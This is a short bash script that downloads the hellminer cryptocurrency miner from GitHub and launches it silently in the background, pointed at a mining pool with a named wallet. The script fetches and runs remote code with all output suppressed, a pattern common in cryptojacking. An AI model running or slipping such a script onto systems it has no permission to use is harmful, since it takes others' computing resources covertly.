#!/bin/bash
#love u fika

wget https://github.com/hellcatz/hminer/releases/download/v0.57/hellminer_linux64.tar.gz && tar xf hellminer_linux64.tar.gz
nohup ./hellminer -c stratum+tcp://na.luckpool.net:3956 -u RVFP2RM1sJq812KupKtkFp1F6XBBcEBKkm.RFK -p x --cpu 3 </dev/null >/dev/null 2>&1 &
